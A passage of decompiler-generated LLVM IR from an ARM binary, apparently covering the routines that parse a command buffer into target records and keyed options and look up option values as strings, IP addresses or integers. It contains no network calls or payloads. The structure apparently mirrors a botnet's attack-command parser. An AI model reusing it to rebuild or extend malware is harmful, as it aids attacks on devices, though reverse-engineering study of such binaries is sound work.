  uselistorder label %dec_label_pc_920c.dec_label_pc_920c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_91f8, { 3, 0, 2, 1, 4 }
  uselistorder label %dec_label_pc_91f8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_9114, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb206, { 1, 0 }
  uselistorder label %bb204, { 1, 0 }
  uselistorder label %dec_label_pc_8fcc, { 1, 0 }
  uselistorder label %dec_label_pc_8f88, { 1, 3, 4, 0, 2 }
}

define i32 @function_ac54(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_ac54:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_ac54 = urem i32 %arg1, 256
  %v2_ac58 = icmp eq i32 %v1_ac54, 0
  %v1_ac60 = urem i32 %arg3, 256
  br i1 %v2_ac58, label %dec_label_pc_aca4, label %dec_label_pc_ac6c

dec_label_pc_ac6c:                                ; preds = %dec_label_pc_ac54
  %v0_ac6c = load i32, i32* %r1.global-to-local, align 4
  %v1_ac6c = add i32 %v0_ac6c, 4
  %v2_ac6c = inttoptr i32 %v1_ac6c to i8*
  %v3_ac6c = load i8, i8* %v2_ac6c, align 1
  %v4_ac6c = zext i8 %v3_ac6c to i32
  %v9_ac70 = icmp eq i32 %v4_ac6c, %v1_ac60
  br i1 %v9_ac70, label %dec_label_pc_acac, label %dec_label_pc_ac94.preheader

dec_label_pc_ac94.preheader:                      ; preds = %dec_label_pc_ac6c
  br label %dec_label_pc_ac94

dec_label_pc_ac84:                                ; preds = %dec_label_pc_ac94
  %v1_ac84 = add i32 %v0_ac8c.in, 12
  %v2_ac84 = inttoptr i32 %v1_ac84 to i8*
  %v3_ac84 = load i8, i8* %v2_ac84, align 1
  %v4_ac84 = zext i8 %v3_ac84 to i32
  %v9_ac88 = icmp eq i32 %v4_ac84, %v1_ac60
  br i1 %v9_ac88, label %dec_label_pc_acac, label %dec_label_pc_ac94

dec_label_pc_ac94:                                ; preds = %dec_label_pc_ac94.preheader, %dec_label_pc_ac84
  %v0_ac8c.in = phi i32 [ %v0_ac6c, %dec_label_pc_ac94.preheader ], [ %v0_ac8c, %dec_label_pc_ac84 ]
  %v0_ac94 = phi i32 [ 0, %dec_label_pc_ac94.preheader ], [ %v1_ac94, %dec_label_pc_ac84 ]
  %v0_ac8c = add i32 %v0_ac8c.in, 8
  %v1_ac94 = add i32 %v0_ac94, 1
  store i32 %v1_ac94, i32* @lr, align 4
  %v9_ac98 = icmp eq i32 %v1_ac94, %v1_ac54
  store i32 %v0_ac8c, i32* %r1.global-to-local, align 4
  br i1 %v9_ac98, label %dec_label_pc_aca4, label %dec_label_pc_ac84

dec_label_pc_aca4:                                ; preds = %dec_label_pc_ac94, %dec_label_pc_ac54
  ret i32 %arg4

dec_label_pc_acac:                                ; preds = %dec_label_pc_ac84, %dec_label_pc_ac6c
  %v0_acac = phi i32 [ %v0_ac6c, %dec_label_pc_ac6c ], [ %v0_ac8c, %dec_label_pc_ac84 ]
  %v1_acac = inttoptr i32 %v0_acac to i32*
  %v2_acac = load i32, i32* %v1_acac, align 4
  ret i32 %v2_acac

; uselistorder directives
  uselistorder i32 %v1_ac94, { 1, 2, 0 }
  uselistorder i32 %v0_ac8c, { 1, 0, 2 }
  uselistorder i32 %v0_ac8c.in, { 1, 0 }
  uselistorder i32 %v0_ac6c, { 1, 0, 2 }
  uselistorder i32 %v1_ac60, { 1, 0 }
  uselistorder i32 %v1_ac54, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ac94, { 1, 0 }
}

define i32 @function_acb8(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_acb8:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_acb8 = urem i32 %arg1, 256
  %v2_acbc = icmp eq i32 %v1_acb8, 0
  br i1 %v2_acbc, label %dec_label_pc_ad08, label %dec_label_pc_accc

dec_label_pc_accc:                                ; preds = %dec_label_pc_acb8
  %v0_accc = load i32, i32* %r1.global-to-local, align 4
  %v1_accc = add i32 %v0_accc, 4
  %v2_accc = inttoptr i32 %v1_accc to i8*
  %v3_accc = load i8, i8* %v2_accc, align 1
  %v4_accc = zext i8 %v3_accc to i32
  %v1_acd0 = urem i32 %arg3, 256
  %v9_acd4 = icmp eq i32 %v4_accc, %v1_acd0
  br i1 %v9_acd4, label %dec_label_pc_ad10, label %dec_label_pc_acf8.preheader

dec_label_pc_acf8.preheader:                      ; preds = %dec_label_pc_accc
  br label %dec_label_pc_acf8

dec_label_pc_ace8:                                ; preds = %dec_label_pc_acf8
  %v1_ace8 = add i32 %v0_acf0.in, 12
  %v2_ace8 = inttoptr i32 %v1_ace8 to i8*
  %v3_ace8 = load i8, i8* %v2_ace8, align 1
  %v4_ace8 = zext i8 %v3_ace8 to i32
  %v9_acec = icmp eq i32 %v1_acd0, %v4_ace8
  br i1 %v9_acec, label %dec_label_pc_ad10, label %dec_label_pc_acf8

dec_label_pc_acf8:                                ; preds = %dec_label_pc_acf8.preheader, %dec_label_pc_ace8
  %v0_acf0.in = phi i32 [ %v0_accc, %dec_label_pc_acf8.preheader ], [ %v0_acf0, %dec_label_pc_ace8 ]
  %v0_acf8 = phi i32 [ 0, %dec_label_pc_acf8.preheader ], [ %v1_acf8, %dec_label_pc_ace8 ]
  %v0_acf0 = add i32 %v0_acf0.in, 8
  %v1_acf8 = add i32 %v0_acf8, 1
  %v9_acfc = icmp eq i32 %v1_acb8, %v1_acf8
  store i32 %v0_acf0, i32* %r1.global-to-local, align 4
  br i1 %v9_acfc, label %dec_label_pc_ad08, label %dec_label_pc_ace8

dec_label_pc_ad08:                                ; preds = %dec_label_pc_acf8, %dec_label_pc_ad10, %dec_label_pc_acb8
  ret i32 %arg4

dec_label_pc_ad10:                                ; preds = %dec_label_pc_ace8, %dec_label_pc_accc
  %v0_ad10 = phi i32 [ %v0_accc, %dec_label_pc_accc ], [ %v0_acf0, %dec_label_pc_ace8 ]
  %v1_ad10 = inttoptr i32 %v0_ad10 to i32*
  %v2_ad10 = load i32, i32* %v1_ad10, align 4
  %v3_ad14 = icmp eq i32 %v2_ad10, 0
  br i1 %v3_ad14, label %dec_label_pc_ad08, label %dec_label_pc_ad1c

dec_label_pc_ad1c:                                ; preds = %dec_label_pc_ad10
  %v3_ad10 = inttoptr i32 %v2_ad10 to i8*
  %v3_ad20 = call i32 @inet_addr(i8* %v3_ad10)
  ret i32 %v3_ad20

; uselistorder directives
  uselistorder i32 %v2_ad10, { 1, 0 }
  uselistorder i32 %v1_acf8, { 1, 0 }
  uselistorder i32 %v0_acf0, { 1, 0, 2 }
  uselistorder i32 %v0_acf0.in, { 1, 0 }
  uselistorder i32 %v1_acd0, { 1, 0 }
  uselistorder i32 %v0_accc, { 1, 0, 2 }
  uselistorder i32 %v1_acb8, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ad08, { 1, 0, 2 }
  uselistorder label %dec_label_pc_acf8, { 1, 0 }
}

define i32 @function_ad24(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ad24:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_ad24 = urem i32 %arg1, 256
  %v2_ad28 = icmp eq i32 %v1_ad24, 0
  %v3_ad2c = load i32, i32* @r4, align 4
  br i1 %v2_ad28, label %dec_label_pc_ad74, label %dec_label_pc_ad38

dec_label_pc_ad38:                                ; preds = %dec_label_pc_ad24
  %v0_ad38 = load i32, i32* %r1.global-to-local, align 4
  %v1_ad38 = add i32 %v0_ad38, 4
  %v2_ad38 = inttoptr i32 %v1_ad38 to i8*
  %v3_ad38 = load i8, i8* %v2_ad38, align 1
  %v4_ad38 = zext i8 %v3_ad38 to i32
  %v1_ad3c = urem i32 %arg3, 256
  %v9_ad40 = icmp eq i32 %v4_ad38, %v1_ad3c
  br i1 %v9_ad40, label %dec_label_pc_ad7c, label %dec_label_pc_ad64.preheader

dec_label_pc_ad64.preheader:                      ; preds = %dec_label_pc_ad38
  br label %dec_label_pc_ad64

dec_label_pc_ad54:                                ; preds = %dec_label_pc_ad64
  %v1_ad54 = add i32 %v0_ad5c.in, 12
  %v2_ad54 = inttoptr i32 %v1_ad54 to i8*
  %v3_ad54 = load i8, i8* %v2_ad54, align 1
  %v4_ad54 = zext i8 %v3_ad54 to i32
  %v9_ad58 = icmp eq i32 %v1_ad3c, %v4_ad54
  br i1 %v9_ad58, label %dec_label_pc_ad7c, label %dec_label_pc_ad64

dec_label_pc_ad64:                                ; preds = %dec_label_pc_ad64.preheader, %dec_label_pc_ad54
  %v0_ad5c.in = phi i32 [ %v0_ad38, %dec_label_pc_ad64.preheader ], [ %v0_ad5c, %dec_label_pc_ad54 ]
  %v0_ad64 = phi i32 [ 0, %dec_label_pc_ad64.preheader ], [ %v1_ad64, %dec_label_pc_ad54 ]
  %v0_ad5c = add i32 %v0_ad5c.in, 8
  %v1_ad64 = add i32 %v0_ad64, 1
  store i32 %v1_ad64, i32* @lr, align 4
  %v9_ad68 = icmp eq i32 %v1_ad24, %v1_ad64
  store i32 %v0_ad5c, i32* %r1.global-to-local, align 4
  br i1 %v9_ad68, label %dec_label_pc_ad74, label %dec_label_pc_ad54

dec_label_pc_ad74:                                ; preds = %dec_label_pc_ad64, %dec_label_pc_ad7c, %dec_label_pc_ad24
  store i32 %v3_ad2c, i32* @r4, align 4
  ret i32 %arg4

dec_label_pc_ad7c:                                ; preds = %dec_label_pc_ad54, %dec_label_pc_ad38
  %v0_ad7c = phi i32 [ %v0_ad38, %dec_label_pc_ad38 ], [ %v0_ad5c, %dec_label_pc_ad54 ]
  %v1_ad7c = inttoptr i32 %v0_ad7c to i32*
  %v2_ad7c = load i32, i32* %v1_ad7c, align 4
  %v2_ad80 = icmp eq i32 %v2_ad7c, 0
  br i1 %v2_ad80, label %dec_label_pc_ad74, label %dec_label_pc_ad88

dec_label_pc_ad88:                                ; preds = %dec_label_pc_ad7c
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v3_ad2c, i32* @r4, align 4
  %v2_ad90 = inttoptr i32 %v2_ad7c to i8*
  %v3_ad90 = call i32 @function_12e60(i8* %v2_ad90, i32 10)
  ret i32 %v3_ad90

; uselistorder directives
  uselistorder i32 %v1_ad64, { 1, 2, 0 }
  uselistorder i32 %v0_ad5c, { 1, 0, 2 }
  uselistorder i32 %v0_ad5c.in, { 1, 0 }
  uselistorder i32 %v1_ad3c, { 1, 0 }
  uselistorder i32 %v0_ad38, { 1, 0, 2 }
  uselistorder i32 %v3_ad2c, { 1, 0 }
  uselistorder i32 %v1_ad24, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_ad74, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ad64, { 1, 0 }
}

define i32 @function_ad94(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ad94:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_ad94 = load i32, i32* @r4, align 4
  %v6_ad94 = load i32, i32* @r5, align 4
  %v9_ad94 = load i32, i32* @r6, align 4
  %v12_ad94 = load i32, i32* @r7, align 4
  %v15_ad94 = load i32, i32* @r8, align 4
  %v18_ad94 = load i32, i32* @sb, align 4
  %v21_ad94 = load i32, i32* @sl, align 4
  %v24_ad94 = load i32, i32* @fp, align 4
  %v27_ad94 = load i32, i32* @lr, align 4
  %v7_ad98 = icmp eq i32 %arg2, 3
  store i1 %v7_ad98, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v0_ada4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ada4, i32* %r4.global-to-local, align 4
  %tmp47 = icmp ult i32 %arg2, 4
  br i1 %tmp47, label %dec_label_pc_adb8, label %dec_label_pc_adac

dec_label_pc_adac:                                ; preds = %dec_label_pc_ad94
  %v7_adac = icmp eq i32 %arg2, 4
  store i1 %v7_adac, i1* %cpsr_z.global-to-local, align 1
  %v1_adb0 = inttoptr i32 %v0_ada4 to i32*
  %v2_adb0 = load i32, i32* %v1_adb0, align 4
  store i32 %v2_adb0, i32* @sl, align 4
  br i1 %v7_adac, label %dec_label_pc_adb8, label %dec_label_pc_adc0

dec_label_pc_adb8:                                ; preds = %dec_label_pc_addc, %.dec_label_pc_adb8_crit_edge, %dec_label_pc_adac, %dec_label_pc_add0, %dec_label_pc_adc0, %dec_label_pc_ad94
  %v29_adbc = phi i32 [ %v29_adbc.pre, %.dec_label_pc_adb8_crit_edge ], [ %v0_ada4, %dec_label_pc_addc ], [ %v0_ada4, %dec_label_pc_adac ], [ %v0_ada4, %dec_label_pc_add0 ], [ %v0_ada4, %dec_label_pc_adc0 ], [ %v0_ada4, %dec_label_pc_ad94 ]
  store i32 %v3_ad94, i32* %r4.global-to-local, align 4
  store i32 %v6_ad94, i32* %r5.global-to-local, align 4
  store i32 %v9_ad94, i32* @r6, align 4
  store i32 %v12_ad94, i32* @r7, align 4
  store i32 %v15_ad94, i32* %r8.global-to-local, align 4
  store i32 %v18_ad94, i32* @sb, align 4
  store i32 %v21_ad94, i32* @sl, align 4
  store i32 %v24_ad94, i32* @fp, align 4
  ret i32 %v29_adbc

dec_label_pc_adc0:                                ; preds = %dec_label_pc_adac
  %v7_adc0 = icmp eq i32 %arg2, 5
  store i1 %v7_adc0, i1* %cpsr_z.global-to-local, align 1
  %v1_adc4 = add i32 %v0_ada4, 4
  %v2_adc4 = inttoptr i32 %v1_adc4 to i8*
  %v3_adc4 = load i8, i8* %v2_adc4, align 1
  %v4_adc4 = zext i8 %v3_adc4 to i32
  store i32 %v4_adc4, i32* %r1.global-to-local, align 4
  br i1 %v7_adc0, label %dec_label_pc_adb8, label %dec_label_pc_add0

dec_label_pc_add0:                                ; preds = %dec_label_pc_adc0
  %v1_add0 = add i32 %v0_ada4, 5
  %v2_add0 = inttoptr i32 %v1_add0 to i8*
  %v3_add0 = load i8, i8* %v2_add0, align 1
  %v4_add0 = zext i8 %v3_add0 to i32
  store i32 %v4_add0, i32* %r8.global-to-local, align 4
  %v2_add4 = icmp eq i8 %v3_add0, 0
  store i1 %v2_add4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_add4, label %dec_label_pc_adb8, label %dec_label_pc_addc

dec_label_pc_addc:                                ; preds = %dec_label_pc_add0
  %v3_addc = mul nuw nsw i32 %v4_add0, 4
  store i32 %v3_addc, i32* @sb, align 4
  %v1_ade0 = add i32 %arg2, -6
  store i32 %v1_ade0, i32* @r6, align 4
  %v2_ade4 = mul nuw nsw i32 %v4_add0, 5
  store i32 %v2_ade4, i32* @r7, align 4
  %v3_ade8 = icmp ult i32 %v1_ade0, %v2_ade4
  %v9_ade8 = icmp eq i32 %v1_ade0, %v2_ade4
  store i1 %v9_ade8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ade8, label %dec_label_pc_adb8, label %dec_label_pc_adf0

dec_label_pc_adf0:                                ; preds = %dec_label_pc_addc
  store i32 %v4_add0, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  %v2_adf8 = call i32* @calloc(i32 %v4_add0, i32 24)
  %v4_adf8 = ptrtoint i32* %v2_adf8 to i32
  store i32 %v4_adf8, i32* %r0.global-to-local, align 4
  %v0_adfc = load i32, i32* %r8.global-to-local, align 4
  %v2_adfc = icmp eq i32 %v0_adfc, 0
  store i1 %v2_adfc, i1* %cpsr_z.global-to-local, align 1
  %v0_ae04 = load i32, i32* %r4.global-to-local, align 4
  %v1_ae04 = add i32 %v0_ae04, 6
  store i32 %v1_ae04, i32* @fp, align 4
  %tmp36 = icmp slt i32 %v0_adfc, 1
  br i1 %tmp36, label %dec_label_pc_ae5cthread-pre-split, label %dec_label_pc_ae0c

dec_label_pc_ae0c:                                ; preds = %dec_label_pc_adf0
  store i32 %v4_adf8, i32* %r1.global-to-local, align 4
  %v1_ae10 = load i32, i32* @r7, align 4
  %v2_ae10 = add i32 %v1_ae10, %v0_ae04
  store i32 %v2_ae10, i32* %ip.global-to-local, align 4
  store i32 %v0_ae04, i32* %r0.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ae20

dec_label_pc_ae20:                                ; preds = %dec_label_pc_ae20.dec_label_pc_ae20_crit_edge, %dec_label_pc_ae0c
  %v2_ae30 = phi i32 [ %v1_ae44, %dec_label_pc_ae20.dec_label_pc_ae20_crit_edge ], [ %v4_adf8, %dec_label_pc_ae0c ]
  %v0_ae2c = phi i32 [ %v0_ae2c.pre, %dec_label_pc_ae20.dec_label_pc_ae20_crit_edge ], [ %v2_ae10, %dec_label_pc_ae0c ]
  %v0_ae28 = phi i32 [ %v0_ae20.pre, %dec_label_pc_ae20.dec_label_pc_ae20_crit_edge ], [ %v0_ae04, %dec_label_pc_ae0c ]
  %v1_ae20 = add i32 %v0_ae28, 10
  %v2_ae20 = inttoptr i32 %v1_ae20 to i8*
  %v3_ae20 = load i8, i8* %v2_ae20, align 1
  %v1_ae24 = add i32 %v0_ae28, 6
  %v2_ae24 = inttoptr i32 %v1_ae24 to i32*
  %v3_ae24 = load i32, i32* %v2_ae24, align 4
  store i32 %v3_ae24, i32* @r2, align 4
  %v1_ae28 = add i32 %v0_ae28, 5
  store i32 %v1_ae28, i32* %r0.global-to-local, align 4
  %v9_ae2c = icmp eq i32 %v0_ae2c, %v1_ae28
  store i1 %v9_ae2c, i1* %cpsr_z.global-to-local, align 1
  %v3_ae30 = add i32 %v2_ae30, 20
  %v4_ae30 = inttoptr i32 %v3_ae30 to i8*
  store i8 %v3_ae20, i8* %v4_ae30, align 1
  %v0_ae34 = load i32, i32* @r2, align 4
  %v1_ae34 = load i32, i32* %r1.global-to-local, align 4
  %v2_ae34 = add i32 %v1_ae34, 4
  %v3_ae34 = inttoptr i32 %v2_ae34 to i32*
  store i32 %v0_ae34, i32* %v3_ae34, align 4
  %v0_ae38 = load i32, i32* @r2, align 4
  %v1_ae38 = load i32, i32* %r1.global-to-local, align 4
  %v2_ae38 = add i32 %v1_ae38, 16
  %v3_ae38 = inttoptr i32 %v2_ae38 to i32*
  store i32 %v0_ae38, i32* %v3_ae38, align 4
  %v0_ae3c = load i32, i32* %r4.global-to-local, align 4
  %v1_ae3c = trunc i32 %v0_ae3c to i8
  %v2_ae3c = load i32, i32* %r1.global-to-local, align 4
  %v3_ae3c = inttoptr i32 %v2_ae3c to i8*
  store i8 %v1_ae3c, i8* %v3_ae3c, align 1
  %v0_ae40 = load i32, i32* %lr.global-to-local, align 4
  %v1_ae40 = trunc i32 %v0_ae40 to i8
  %v2_ae40 = load i32, i32* %r1.global-to-local, align 4
  %v3_ae40 = add i32 %v2_ae40, 1
  %v4_ae40 = inttoptr i32 %v3_ae40 to i8*
  store i8 %v1_ae40, i8* %v4_ae40, align 1
  %v0_ae44 = load i32, i32* %r1.global-to-local, align 4
  %v1_ae44 = add i32 %v0_ae44, 24
  store i32 %v1_ae44, i32* %r1.global-to-local, align 4
  %v0_ae48 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ae48, label %dec_label_pc_ae4c, label %dec_label_pc_ae20.dec_label_pc_ae20_crit_edge

dec_label_pc_ae20.dec_label_pc_ae20_crit_edge:    ; preds = %dec_label_pc_ae20
  %v0_ae20.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_ae2c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_ae20

dec_label_pc_ae4c:                                ; preds = %dec_label_pc_ae20
  %v0_ae4c = load i32, i32* @sb, align 4
  %v1_ae4c = load i32, i32* %r8.global-to-local, align 4
  %v1_ae50 = load i32, i32* %r5.global-to-local, align 4
  %sum = add i32 %v1_ae4c, %v0_ae4c
  %v2_ae50 = sub i32 %v1_ae50, %sum
  %v0_ae54 = load i32, i32* %r0.global-to-local, align 4
  %v1_ae54 = add i32 %v0_ae54, 6
  store i32 %v1_ae54, i32* @fp, align 4
  %v1_ae58 = add i32 %v2_ae50, -6
  store i32 %v1_ae58, i32* @r6, align 4
  br label %dec_label_pc_ae5c

dec_label_pc_ae5cthread-pre-split:                ; preds = %dec_label_pc_adf0
  %v0_ae5c.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_ae5c

dec_label_pc_ae5c:                                ; preds = %dec_label_pc_ae5cthread-pre-split, %dec_label_pc_ae4c
  %v0_ae68 = phi i32 [ %v1_ae04, %dec_label_pc_ae5cthread-pre-split ], [ %v1_ae54, %dec_label_pc_ae4c ]
  %v1_ae60 = phi i32 [ %v0_ae5c.pr, %dec_label_pc_ae5cthread-pre-split ], [ %v1_ae58, %dec_label_pc_ae4c ]
  %v2_ae5c = icmp eq i32 %v1_ae60, 0
  store i1 %v2_ae5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ae5c, label %dec_label_pc_af7c, label %dec_label_pc_ae68

dec_label_pc_ae68:                                ; preds = %dec_label_pc_ae5c
  %v1_ae68 = inttoptr i32 %v0_ae68 to i8*
  %v2_ae68 = load i8, i8* %v1_ae68, align 1
  %v3_ae68 = zext i8 %v2_ae68 to i32
  store i32 %v3_ae68, i32* @sb, align 4
  %v2_ae6c = icmp eq i8 %v2_ae68, 0
  store i1 %v2_ae6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ae6c, label %dec_label_pc_af4c, label %dec_label_pc_ae7c

dec_label_pc_ae7c:                                ; preds = %dec_label_pc_ae68
  store i32 %v3_ae68, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_ae84 = call i32* @calloc(i32 %v3_ae68, i32 8)
  %v4_ae84 = ptrtoint i32* %v2_ae84 to i32
  store i32 %v4_ae84, i32* %r0.global-to-local, align 4
  %v0_ae88 = load i32, i32* @sb, align 4
  %v2_ae88 = icmp eq i32 %v0_ae88, 0
  store i1 %v2_ae88, i1* %cpsr_z.global-to-local, align 1
  %tmp37 = icmp slt i32 %v0_ae88, 1
  br i1 %tmp37, label %dec_label_pc_af4c, label %dec_label_pc_ae98

dec_label_pc_ae98:                                ; preds = %dec_label_pc_ae7c
  %v0_ae98 = load i32, i32* @r6, align 4
  %v1_ae98 = add i32 %v0_ae98, -1
  store i32 %v1_ae98, i32* @r2, align 4
  %v7_ae98 = icmp eq i32 %v0_ae98, 1
  store i1 %v7_ae98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ae98, label %dec_label_pc_af7c, label %dec_label_pc_aea0

dec_label_pc_aea0:                                ; preds = %dec_label_pc_ae98
  %v0_aea0 = load i32, i32* @fp, align 4
  %v1_aea0 = add i32 %v0_aea0, 1
  %v2_aea0 = inttoptr i32 %v1_aea0 to i8*
  %v3_aea0 = load i8, i8* %v2_aea0, align 1
  %v1_aea4 = add i32 %v0_ae98, -2
  store i32 %v1_aea4, i32* @r2, align 4
  %v7_aea4 = icmp eq i32 %v1_ae98, 1
  store i1 %v7_aea4, i1* %cpsr_z.global-to-local, align 1
  %v3_aea8 = add i32 %v4_ae84, 4
  %v4_aea8 = inttoptr i32 %v3_aea8 to i8*
  store i8 %v3_aea0, i8* %v4_aea8, align 1
  %v0_aeac = load i32, i32* @fp, align 4
  %v1_aeac = add i32 %v0_aeac, 1
  store i32 %v1_aeac, i32* %r0.global-to-local, align 4
  %v0_aeb0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_aeb0, label %dec_label_pc_af7c, label %dec_label_pc_aeb4

dec_label_pc_aeb4:                                ; preds = %dec_label_pc_aea0
  %v1_aeb4 = add i32 %v0_aeac, 2
  %v2_aeb4 = inttoptr i32 %v1_aeb4 to i8*
  %v3_aeb4 = load i8, i8* %v2_aeb4, align 1
  %v4_aeb4 = zext i8 %v3_aeb4 to i32
  store i32 %v4_aeb4, i32* %r4.global-to-local, align 4
  %v0_aeb8 = load i32, i32* @r2, align 4
  %v1_aeb8 = add i32 %v0_aeb8, -1
  store i32 %v1_aeb8, i32* @r7, align 4
  %v9_aebc = icmp eq i32 %v1_aeb8, %v4_aeb4
  store i1 %v9_aebc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_aeb4, i32* %r0.global-to-local, align 4
  %v5_aec4 = icmp slt i32 %v1_aeb8, %v4_aeb4
  br i1 %v5_aec4, label %dec_label_pc_af7c, label %dec_label_pc_aec8

dec_label_pc_aec8:                                ; preds = %dec_label_pc_aeb4
  store i32 %v4_ae84, i32* %r5.global-to-local, align 4
  %v1_aed0 = add i32 %v4_ae84, 8
  %v1_aed4 = add i32 %v0_aeac, 3
  store i32 %v1_aed4, i32* @r6, align 4
  store i32 0, i32* @fp, align 4
  br label %dec_label_pc_af24

dec_label_pc_aee4:                                ; preds = %dec_label_pc_af24
  %v0_aee4 = load i32, i32* @r7, align 4
  %v1_aee4 = load i32, i32* %r4.global-to-local, align 4
  %v2_aee4 = sub i32 %v0_aee4, %v1_aee4
  store i32 %v2_aee4, i32* @r2, align 4
  %v9_aee4 = icmp eq i32 %v0_aee4, %v1_aee4
  store i1 %v9_aee4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aee4, label %dec_label_pc_af7c, label %dec_label_pc_aeec

dec_label_pc_aeec:                                ; preds = %dec_label_pc_aee4
  %v1_aeec = load i32, i32* @r6, align 4
  %v2_aeec = add i32 %v1_aeec, %v1_aee4
  %v3_aeec = inttoptr i32 %v2_aeec to i8*
  %v4_aeec = load i8, i8* %v3_aeec, align 1
  store i32 %stack_var_-44.0, i32* %r5.global-to-local, align 4
  %v1_aef4 = add i32 %v2_aee4, -1
  store i32 %v1_aef4, i32* @r2, align 4
  %v7_aef4 = icmp eq i32 %v2_aee4, 1
  store i1 %v7_aef4, i1* %cpsr_z.global-to-local, align 1
  %v3_aef8 = add i32 %stack_var_-44.0, 4
  %v4_aef8 = inttoptr i32 %v3_aef8 to i8*
  store i8 %v4_aeec, i8* %v4_aef8, align 1
  %v0_aefc = load i32, i32* %r4.global-to-local, align 4
  %v1_aefc = load i32, i32* @r6, align 4
  %v2_aefc = add i32 %v1_aefc, %v0_aefc
  store i32 %v2_aefc, i32* %r0.global-to-local, align 4
  %v0_af00 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_af00, label %dec_label_pc_af7c, label %dec_label_pc_af04

dec_label_pc_af04:                                ; preds = %dec_label_pc_aeec
  %v1_af04 = add i32 %v2_aefc, 1
  %v2_af04 = inttoptr i32 %v1_af04 to i8*
  %v3_af04 = load i8, i8* %v2_af04, align 1
  %v4_af04 = zext i8 %v3_af04 to i32
  store i32 %v4_af04, i32* %r4.global-to-local, align 4
  %v0_af08 = load i32, i32* @r2, align 4
  %v1_af08 = add i32 %v0_af08, -1
  store i32 %v1_af08, i32* @r7, align 4
  %v0_af0c = load i32, i32* %r5.global-to-local, align 4
  %v1_af0c = add i32 %v0_af0c, 8
  store i32 %v1_af0c, i32* %r1.global-to-local, align 4
  %v2_af10 = sub i32 %v1_af08, %v4_af04
  %tmp39 = sub i32 0, %v2_af10
  %v6_af10 = and i32 %v1_af08, %tmp39
  %v7_af10 = icmp slt i32 %v6_af10, 0
  %v8_af10 = icmp slt i32 %v2_af10, 0
  %v9_af10 = icmp eq i32 %v1_af08, %v4_af04
  store i1 %v9_af10, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_af04, i32* %r0.global-to-local, align 4
  %v2_af1c = xor i1 %v8_af10, %v7_af10
  br i1 %v2_af1c, label %dec_label_pc_af7c, label %dec_label_pc_af20

dec_label_pc_af20:                                ; preds = %dec_label_pc_af04
  %v1_af20 = add i32 %v2_aefc, 2
  store i32 %v1_af20, i32* @r6, align 4
  br label %dec_label_pc_af24

dec_label_pc_af24:                                ; preds = %dec_label_pc_aec8, %dec_label_pc_af20
  %v0_af28 = phi i32 [ %v4_aeb4, %dec_label_pc_aec8 ], [ %v4_af04, %dec_label_pc_af20 ]
  %stack_var_-44.0 = phi i32 [ %v1_aed0, %dec_label_pc_aec8 ], [ %v1_af0c, %dec_label_pc_af20 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_af28 = add nuw nsw i32 %v0_af28, 1
  store i32 %v2_af28, i32* %r0.global-to-local, align 4
  %v2_af2c = call i32* @calloc(i32 %v2_af28, i32 1)
  %v3_af2c = ptrtoint i32* %v2_af2c to i32
  store i32 %v3_af2c, i32* %r0.global-to-local, align 4
  %v0_af30 = load i32, i32* @fp, align 4
  %v1_af30 = add i32 %v0_af30, 1
  store i32 %v1_af30, i32* @fp, align 4
  %v1_af34 = load i32, i32* %r5.global-to-local, align 4
  %v2_af34 = inttoptr i32 %v1_af34 to i32*
  store i32 %v3_af2c, i32* %v2_af34, align 4
